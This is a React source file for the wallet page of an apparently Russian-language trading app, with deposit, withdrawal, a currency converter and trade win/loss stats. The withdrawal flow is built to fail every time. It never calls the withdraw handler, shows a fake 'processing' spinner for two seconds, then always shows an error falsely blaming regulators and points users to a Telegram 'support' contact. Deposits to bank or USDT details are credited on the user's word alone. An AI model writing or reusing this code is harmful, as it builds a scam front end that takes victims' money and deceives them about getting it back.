import React, { useState } from 'react';
import { ArrowUpRight, ArrowDownLeft, History, Wallet, Plus, X, Copy, Check, CreditCard, AlertCircle, TrendingUp, TrendingDown, Sparkles, Bitcoin, RefreshCw, Clock, CheckCircle, XCircle } from 'lucide-react';
import { UsdtIcon, getCryptoIcon } from '../icons';
import type { Transaction, DbSettings } from '../types';

interface WalletPageProps {
  history: Transaction[];
  balance: number;
  onDeposit: (amount: number, method: string) => void;
  onWithdraw: (amount: number) => void;
  settings: DbSettings;
  onModalChange?: (isOpen: boolean) => void;
}

type DepositMethod = 'card' | 'crypto';

interface WithdrawRequest {
  id: string;
  amount: number;
  status: 'pending' | 'completed' | 'rejected';
  date: string;
}

const WalletPage: React.FC<WalletPageProps> = ({ history, balance, onDeposit, onWithdraw, settings, onModalChange }) => {
    const [activeModal, setActiveModal] = useState<'deposit' | 'withdraw' | 'converter' | 'processing' | 'withdraw-error' | null>(null);
    const [depositMethod, setDepositMethod] = useState<DepositMethod | null>(null);
    const [copied, setCopied] = useState(false);
    const [depositAmount, setDepositAmount] = useState('5000');
    const [withdrawAmount, setWithdrawAmount] = useState('');
    const [withdrawAddress, setWithdrawAddress] = useState('');
    const [withdrawError, setWithdrawError] = useState<string | null>(null);
    
    // Converter state
    const [convertFrom, setConvertFrom] = useState('RUB');
    const [convertTo, setConvertTo] = useState('USDT');
    const [convertAmount, setConvertAmount] = useState('1000');

    // Активные заявки на вывод
    const [withdrawRequests] = useState<WithdrawRequest[]>([
      // { id: '1', amount: 100, status: 'pending', date: '22.12.2024' },
    ]);

    const details = settings.bank_details || "Sberbank: 0000 0000 0000 0000";

    // Актуальные курсы валют
    const rates: Record<string, number> = {
      'RUB_USDT': 0.0105,
      'USDT_RUB': 95,
      'BTC_USDT': 68000,
      'USDT_BTC': 0.0000147,
      'ETH_USDT': 3500,
      'USDT_ETH': 0.000286,
    };

    const getConvertedAmount = () => {
      const key = `${convertFrom}_${convertTo}`;
      const rate = rates[key] || 1;
      return (parseFloat(convertAmount) * rate).toFixed(convertTo === 'BTC' ? 8 : 2);
    };

    const wins = history.filter(t => t.type === 'win').length;
    const losses = history.filter(t => t.type === 'loss').length;
    const totalTrades = wins + losses;
    const winRate = totalTrades > 0 ? Math.round((wins / totalTrades) * 100) : 0;

    const handleCopy = (text: string) => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const openModal = (type: 'deposit' | 'withdraw' | 'converter') => {
        setActiveModal(type);
        setDepositMethod(null);
        onModalChange?.(true);
    };

    const closeModal = () => {
        setActiveModal(null);
        setDepositMethod(null);
        onModalChange?.(false);
    };

    const submitDeposit = () => {
        const val = parseFloat(depositAmount);
        if (val > 0 && depositMethod) {
            onDeposit(val, depositMethod);
            closeModal();
            setDepositAmount('5000');
        }
    };

    const submitWithdraw = () => {
        const val = parseFloat(withdrawAmount);
        if (val <= 0) return;
        if (val > balance) {
            setWithdrawError("Недостаточно средств");
            return;
        }
        
        // Показываем окно обработки
        setActiveModal('processing');
        
        // Через 2 секунды показываем ошибку
        setTimeout(() => {
            setActiveModal('withdraw-error');
        }, 2000);
    };

    // Адреса для пополнения криптовалютой
    const cryptoAddresses = {
      BTC: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
      ETH: '0x742d35Cc6634C0532925a3b844Bc9e7595f...',
      USDT: 'TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9',
    };

    return (
        <div className="h-full flex flex-col bg-black text-white relative">
            {/* Header */}
            <div className="px-4 pt-6 pb-4 shrink-0 bg-black">
                <div className="flex items-center justify-between mb-4">
                    <h1 className="text-xl font-bold flex items-center gap-2">
                        <Wallet className="text-[#0098EA]" size={22} />
                        Кошелек
                    </h1>
                    <button onClick={() => openModal('converter')} className="flex items-center gap-1.5 px-3 py-1.5 bg-[#1c1c1e] rounded-lg text-xs text-gray-400 hover:text-white">
                        <RefreshCw size={14} />
                        Конвертер
                    </button>
                </div>

                {/* Balance Card */}
                <div className="w-full rounded-2xl relative overflow-hidden bg-gradient-to-br from-[#1c1c1e] to-[#111113] border border-gray-800/50 p-4">
                    <div className="flex items-center justify-between mb-3">
                        <span className="text-gray-500 text-xs font-medium uppercase">Баланс</span>
                        <div className="flex items-center gap-1 text-[#00C896] text-xs">
                            <Sparkles size={10} />
                            Active
                        </div>
                    </div>
                    
                    <div className="text-3xl font-bold text-white mb-4">
                        ${balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                    </div>

                    <div className="flex gap-2">
                        <button onClick={() => openModal('deposit')} className="flex-1 bg-[#0098EA] text-white rounded-xl py-2.5 flex items-center justify-center gap-2 active:scale-[0.98] font-semibold text-sm">
                            <Plus size={16} /> Пополнить
                        </button>
                        <button onClick={() => openModal('withdraw')} className="flex-1 bg-[#2c2c2e] text-white rounded-xl py-2.5 flex items-center justify-center gap-2 active:scale-[0.98] border border-gray-700/50 font-semibold text-sm">
                            <ArrowUpRight size={16} /> Вывести
                        </button>
                    </div>
                </div>
            </div>

            {/* Stats */}
            {totalTrades > 0 && (
                <div className="px-4 pb-3 shrink-0 flex gap-2">
                    <div className="flex-1 bg-[#1c1c1e] rounded-xl p-2.5 text-center">
                        <div className="text-[10px] text-gray-500 uppercase">Сделок</div>
                        <div className="font-bold">{totalTrades}</div>
                    </div>
                    <div className="flex-1 bg-[#1c1c1e] rounded-xl p-2.5 text-center">
                        <div className="text-[10px] text-gray-500 uppercase">Винрейт</div>
                        <div className={`font-bold ${winRate >= 50 ? 'text-[#00C896]' : 'text-[#FF3B30]'}`}>{winRate}%</div>
                    </div>
                    <div className="flex-1 bg-[#00C896]/10 rounded-xl p-2.5 text-center border border-[#00C896]/20">
                        <div className="text-[10px] text-[#00C896] uppercase">Win</div>
                        <div className="font-bold text-[#00C896]">{wins}</div>
                    </div>
                    <div className="flex-1 bg-[#FF3B30]/10 rounded-xl p-2.5 text-center border border-[#FF3B30]/20">
                        <div className="text-[10px] text-[#FF3B30] uppercase">Loss</div>
                        <div className="font-bold text-[#FF3B30]">{losses}</div>
                    </div>
                </div>
            )}

            {/* Withdraw Requests */}
            {withdrawRequests.length > 0 && (
                <div className="px-4 pb-3 shrink-0">
                    <div className="bg-[#1c1c1e] rounded-xl p-3 border border-gray-800/50">
                        <div className="text-xs text-gray-500 uppercase mb-2 flex items-center gap-1">
                            <Clock size={12} /> Заявки на вывод
                        </div>
                        {withdrawRequests.map(req => (
                            <div key={req.id} className="flex items-center justify-between py-2 border-t border-gray-800/30">
                                <div>
                                    <span className="font-semibold">${req.amount}</span>
                                    <span className="text-xs text-gray-500 ml-2">{req.date}</span>
                                </div>
                                <div className={`flex items-center gap-1 text-xs font-medium ${
                                    req.status === 'pending' ? 'text-yellow-500' :
                                    req.status === 'completed' ? 'text-[#00C896]' : 'text-[#FF3B30]'
                                }`}>
                                    {req.status === 'pending' && <><Clock size={12} /> В обработке</>}
                                    {req.status === 'completed' && <><CheckCircle size={12} /> Выполнено</>}
                                    {req.status === 'rejected' && <><XCircle size={12} /> Отклонено</>}
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {/* History */}
            <div className="flex-1 bg-[#111113] rounded-t-3xl border-t border-gray-800/50 overflow-hidden flex flex-col">
                <div className="px-4 pt-4 pb-2 flex justify-between items-center shrink-0">
                    <h2 className="font-bold text-sm">История</h2>
                    <span className="text-xs text-gray-500">{history.length}</span>
                </div>
                
                <div className="flex-1 overflow-y-auto no-scrollbar px-4 pb-24">
                    {history.length === 0 ? (
                        <div className="flex flex-col items-center justify-center py-12 text-gray-600">
                            <History size={36} className="mb-2 opacity-50" />
                            <span className="text-sm">Нет операций</span>
                        </div>
                    ) : (
                        <div className="space-y-2">
                            {history.map(tx => (
                                <div key={tx.id} className="bg-[#1c1c1e] p-3 rounded-xl flex items-center justify-between">
                                    <div className="flex items-center gap-3">
                                        <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${
                                            tx.type === 'win' ? 'bg-[#00C896]/15 text-[#00C896]' : 
                                            tx.type === 'loss' ? 'bg-[#FF3B30]/15 text-[#FF3B30]' : 
                                            tx.type === 'deposit' ? 'bg-[#0098EA]/15 text-[#0098EA]' :
                                            'bg-gray-800 text-gray-400'
                                        }`}>
                                            {tx.type === 'win' && <TrendingUp size={14} />}
                                            {tx.type === 'loss' && <TrendingDown size={14} />}
                                            {tx.type === 'deposit' && <ArrowDownLeft size={14} />}
                                            {tx.type === 'withdraw' && <ArrowUpRight size={14} />}
                                        </div>
                                        <div>
                                            <span className="text-sm font-medium">
                                                {tx.type === 'win' || tx.type === 'loss' ? tx.asset : 
                                                 tx.type === 'deposit' ? 'Пополнение' : 'Вывод'}
                                            </span>
                                            <span className="text-[10px] text-gray-500 block">{tx.amountUsd}</span>
                                        </div>
                                    </div>
                                    <div className={`text-sm font-bold ${
                                        tx.type === 'win' || tx.type === 'deposit' ? 'text-[#00C896]' : 'text-[#FF3B30]'
                                    }`}>{tx.amount}</div>
                                </div>
                            ))}
                        </div>
                    )}
                </div>
            </div>

            {/* Deposit Modal */}
            {activeModal === 'deposit' && (
                <div className="fixed inset-0 z-[100] flex items-end justify-center">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={closeModal}></div>
                    <div className="bg-[#1c1c1e] w-full max-w-lg rounded-t-3xl border-t border-gray-700/50 relative z-10 p-5 pb-8 animate-[slideUp_0.3s_ease-out] max-h-[85vh] overflow-y-auto">
                        <div className="w-10 h-1 bg-gray-700 rounded-full mx-auto mb-4"></div>
                        
                        <div className="flex justify-between items-center mb-4">
                            <h2 className="text-lg font-bold">Пополнение</h2>
                            <button onClick={closeModal} className="p-2 bg-gray-800/50 rounded-full text-gray-400">
                                <X size={18} />
                            </button>
                        </div>

                        {!depositMethod ? (
                            <div className="space-y-3">
                                <p className="text-sm text-gray-400 mb-4">Выберите способ пополнения</p>

                                <button onClick={() => setDepositMethod('card')} className="w-full bg-[#2c2c2e] p-4 rounded-xl flex items-center gap-4 hover:bg-[#3a3a3c] transition-colors border border-transparent hover:border-gray-700">
                                    <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#FF6B6B] to-[#FF3B30] flex items-center justify-center">
                                        <CreditCard size={24} className="text-white" />
                                    </div>
                                    <div className="text-left flex-1">
                                        <div className="font-semibold">Банковская карта</div>
                                        <div className="text-xs text-gray-500">Visa, Mastercard, МИР</div>
                                    </div>
                                    <div className="text-xs text-gray-500">~5 мин</div>
                                </button>

                                <button onClick={() => setDepositMethod('crypto')} className="w-full bg-[#2c2c2e] p-4 rounded-xl flex items-center gap-4 hover:bg-[#3a3a3c] transition-colors border border-transparent hover:border-gray-700">
                                    <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#F7931A] to-[#FF6B00] flex items-center justify-center">
                                        <Bitcoin size={24} className="text-white" />
                                    </div>
                                    <div className="text-left flex-1">
                                        <div className="font-semibold">Криптовалюта</div>
                                        <div className="text-xs text-gray-500">BTC, ETH, USDT</div>
                                    </div>
                                    <div className="text-xs text-gray-500">~10 мин</div>
                                </button>
                            </div>
                        ) : depositMethod === 'crypto' ? (
                            <div className="space-y-4">
                                <button onClick={() => setDepositMethod(null)} className="text-sm text-[#0098EA] mb-2">← Назад</button>
                                
                                <div className="text-center">
                                    <div className="text-sm text-gray-400 mb-3">Отправьте USDT (TRC20) на адрес:</div>
                                    
                                    {/* QR Code placeholder */}
                                    <div className="w-48 h-48 mx-auto bg-white rounded-2xl p-3 mb-4">
                                        <div className="w-full h-full bg-[url('https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9')] bg-contain bg-center bg-no-repeat"></div>
                                    </div>
                                    
                                    <div className="bg-[#111113] rounded-xl p-3 flex items-center gap-2">
                                        <code className="text-xs text-white flex-1 break-all">{cryptoAddresses.USDT}</code>
                                        <button onClick={() => handleCopy(cryptoAddresses.USDT)} className={`p-2 rounded-lg ${copied ? 'bg-[#00C896]/20 text-[#00C896]' : 'bg-gray-700 text-gray-400'}`}>
                                            {copied ? <Check size={14} /> : <Copy size={14} />}
                                        </button>
                                    </div>
                                </div>

                                <div className="bg-yellow-500/10 p-3 rounded-xl border border-yellow-500/20 text-xs text-yellow-500">
                                    ⚠️ Отправляйте только USDT в сети TRC20. Другие токены будут потеряны.
                                </div>
                            </div>
                        ) : (
                            <div className="space-y-4">
                                <button onClick={() => setDepositMethod(null)} className="text-sm text-[#0098EA] mb-2">← Назад</button>
                                
                                <div>
                                    <label className="text-xs text-gray-500 uppercase mb-2 block">Сумма (RUB)</label>
                                    <input type="number" value={depositAmount} onChange={e => setDepositAmount(e.target.value)} className="w-full bg-[#111113] rounded-xl p-3 text-lg font-bold outline-none border border-gray-800 focus:border-[#0098EA]" placeholder="5000" />
                                    <div className="text-xs text-gray-500 mt-1">≈ ${(parseFloat(depositAmount || '0') * 0.0105).toFixed(2)} USDT</div>
                                </div>

                                {depositMethod === 'card' && (
                                    <div className="bg-[#2c2c2e] p-4 rounded-xl">
                                        <div className="text-xs text-[#0098EA] uppercase mb-2">Реквизиты</div>
                                        <div className="flex items-center gap-2">
                                            <span className="font-mono text-sm flex-1">{details}</span>
                                            <button onClick={() => handleCopy(details)} className={`p-2 rounded-lg ${copied ? 'bg-[#00C896]/20 text-[#00C896]' : 'bg-gray-700 text-gray-400'}`}>
                                                {copied ? <Check size={14} /> : <Copy size={14} />}
                                            </button>
                                        </div>
                                    </div>
                                )}

                                <button onClick={submitDeposit} className="w-full bg-[#00C896] text-black font-bold py-3.5 rounded-xl active:scale-[0.98]">
                                    Я перевел средства
                                </button>
                            </div>
                        )}
                    </div>
                </div>
            )}

            {/* Withdraw Modal */}
            {activeModal === 'withdraw' && (
                <div className="fixed inset-0 z-[100] flex items-end justify-center">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={closeModal}></div>
                    <div className="bg-[#1c1c1e] w-full max-w-lg rounded-t-3xl border-t border-gray-700/50 relative z-10 p-5 pb-8 animate-[slideUp_0.3s_ease-out]">
                        <div className="w-10 h-1 bg-gray-700 rounded-full mx-auto mb-4"></div>
                        
                        <div className="flex justify-between items-center mb-4">
                            <h2 className="text-lg font-bold">Вывод</h2>
                            <button onClick={closeModal} className="p-2 bg-gray-800/50 rounded-full text-gray-400">
                                <X size={18} />
                            </button>
                        </div>

                        <div className="space-y-4">
                            <div className="flex items-center gap-3 bg-[#111113] p-3 rounded-xl border border-gray-800">
                                <div className="w-9 h-9 rounded-full bg-[#26A17B] flex items-center justify-center">
                                    <UsdtIcon size={20} />
                                </div>
                                <div>
                                    <div className="text-sm font-semibold">USDT</div>
                                    <div className="text-xs text-gray-500">Баланс: ${balance.toFixed(2)}</div>
                                </div>
                            </div>

                            <div>
                                <label className="text-xs text-gray-500 uppercase mb-2 block">Номер карты</label>
                                <div className="bg-[#111113] rounded-xl p-3 flex items-center border border-gray-800 focus-within:border-[#0098EA]">
                                    <CreditCard className="text-gray-500 mr-2" size={18} />
                                    <input type="text" value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} placeholder="0000 0000 0000 0000" className="bg-transparent text-white font-mono outline-none w-full" />
                                </div>
                            </div>

                            <div>
                                <label className="text-xs text-gray-500 uppercase mb-2 block">Сумма</label>
                                <div className={`bg-[#111113] rounded-xl p-3 flex items-center border ${withdrawError ? 'border-[#FF3B30]' : 'border-gray-800 focus-within:border-[#0098EA]'}`}>
                                    <input type="number" placeholder="0.00" className="bg-transparent text-white text-lg font-bold outline-none w-full" value={withdrawAmount} onChange={e => { setWithdrawAmount(e.target.value); setWithdrawError(null); }} />
                                    <span className="text-gray-500 font-semibold text-sm">USD</span>
                                </div>
                                {withdrawError && <div className="flex items-center gap-1 mt-2 text-xs text-[#FF3B30]"><AlertCircle size={12} />{withdrawError}</div>}
                                <div className="text-xs text-gray-500 mt-1">Комиссия: 1 USDT</div>
                            </div>

                            <button onClick={submitWithdraw} className="w-full bg-[#0098EA] text-white font-bold py-3.5 rounded-xl active:scale-[0.98]">
                                Подтвердить вывод
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* Converter Modal */}
            {activeModal === 'converter' && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={closeModal}></div>
                    <div className="bg-[#1c1c1e] w-full max-w-sm rounded-3xl border border-gray-700/50 relative z-10 p-5 animate-[scaleIn_0.2s_ease-out]">
                        <div className="flex justify-between items-center mb-4">
                            <h2 className="text-lg font-bold flex items-center gap-2">
                                <RefreshCw size={18} className="text-[#0098EA]" />
                                Конвертер
                            </h2>
                            <button onClick={closeModal} className="p-2 bg-gray-800/50 rounded-full text-gray-400">
                                <X size={18} />
                            </button>
                        </div>

                        <div className="space-y-3">
                            <div className="bg-[#111113] rounded-xl p-3 border border-gray-800">
                                <div className="flex justify-between items-center mb-2">
                                    <span className="text-xs text-gray-500">Отдаю</span>
                                    <div className="flex items-center gap-2">
                                        {getCryptoIcon(convertFrom, 16)}
                                        <select value={convertFrom} onChange={e => setConvertFrom(e.target.value)} className="bg-transparent text-sm font-semibold outline-none">
                                            <option value="RUB">RUB</option>
                                            <option value="USDT">USDT</option>
                                            <option value="BTC">BTC</option>
                                            <option value="ETH">ETH</option>
                                        </select>
                                    </div>
                                </div>
                                <input type="number" value={convertAmount} onChange={e => setConvertAmount(e.target.value)} className="w-full bg-transparent text-2xl font-bold outline-none" />
                            </div>

                            <div className="flex justify-center">
                                <button onClick={() => { const t = convertFrom; setConvertFrom(convertTo); setConvertTo(t); }} className="w-10 h-10 rounded-full bg-[#2c2c2e] flex items-center justify-center text-gray-400 hover:text-white">
                                    <RefreshCw size={18} />
                                </button>
                            </div>

                            <div className="bg-[#111113] rounded-xl p-3 border border-gray-800">
                                <div className="flex justify-between items-center mb-2">
                                    <span className="text-xs text-gray-500">Получаю</span>
                                    <div className="flex items-center gap-2">
                                        {getCryptoIcon(convertTo, 16)}
                                        <select value={convertTo} onChange={e => setConvertTo(e.target.value)} className="bg-transparent text-sm font-semibold outline-none">
                                            <option value="USDT">USDT</option>
                                            <option value="RUB">RUB</option>
                                            <option value="BTC">BTC</option>
                                            <option value="ETH">ETH</option>
                                        </select>
                                    </div>
                                </div>
                                <div className="text-2xl font-bold text-[#00C896]">{getConvertedAmount()}</div>
                            </div>

                            <div className="text-center text-xs text-gray-500">
                                Курс: 1 {convertFrom} = {rates[`${convertFrom}_${convertTo}`] || '—'} {convertTo}
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Processing Modal */}
            {activeModal === 'processing' && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm"></div>
                    <div className="bg-[#1c1c1e] w-full max-w-sm rounded-3xl border border-gray-700/50 relative z-10 p-8 animate-[scaleIn_0.2s_ease-out]">
                        <div className="flex flex-col items-center text-center">
                            <div className="w-16 h-16 border-4 border-[#0098EA] border-t-transparent rounded-full animate-spin mb-4"></div>
                            <h3 className="text-lg font-bold mb-2">Обработка запроса</h3>
                            <p className="text-sm text-gray-400">Проверяем данные для вывода средств...</p>
                        </div>
                    </div>
                </div>
            )}

            {/* Withdraw Error Modal */}
            {activeModal === 'withdraw-error' && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={closeModal}></div>
                    <div className="bg-[#1c1c1e] w-full max-w-sm rounded-3xl border border-gray-700/50 relative z-10 p-6 animate-[scaleIn_0.2s_ease-out]">
                        <div className="flex flex-col items-center text-center">
                            <div className="w-16 h-16 rounded-full bg-[#FF3B30]/20 flex items-center justify-center mb-4">
                                <AlertCircle size={32} className="text-[#FF3B30]" />
                            </div>
                            
                            <h3 className="text-lg font-bold mb-2">Вывод невозможен</h3>
                            
                            <p className="text-sm text-gray-400 mb-4 leading-relaxed">
                                Вывод средств возможен только на те реквизиты, с которых производилось пополнение счета.
                            </p>

                            <div className="w-full bg-[#111113] rounded-xl p-4 mb-4 border border-gray-800">
                                <div className="flex items-start gap-3 text-left">
                                    <AlertCircle size={18} className="text-[#0098EA] mt-0.5 shrink-0" />
                                    <div className="text-xs text-gray-400">
                                        Это требование регулятора для предотвращения отмывания денег и обеспечения безопасности ваших средств.
                                    </div>
                                </div>
                            </div>

                            <p className="text-sm text-gray-300 mb-6">
                                Для вывода средств обратитесь в службу поддержки
                            </p>

                            <div className="flex gap-2 w-full">
                                <button 
                                    onClick={closeModal}
                                    className="flex-1 bg-[#2c2c2e] text-white font-semibold py-3 rounded-xl active:scale-[0.98] border border-gray-700"
                                >
                                    Закрыть
                                </button>
                                <a 
                                    href={`https://t.me/${settings.support_username?.replace('@', '')}`}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="flex-1 bg-[#0098EA] text-white font-semibold py-3 rounded-xl active:scale-[0.98] flex items-center justify-center gap-2"
                                >
                                    Поддержка
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

export default WalletPage;
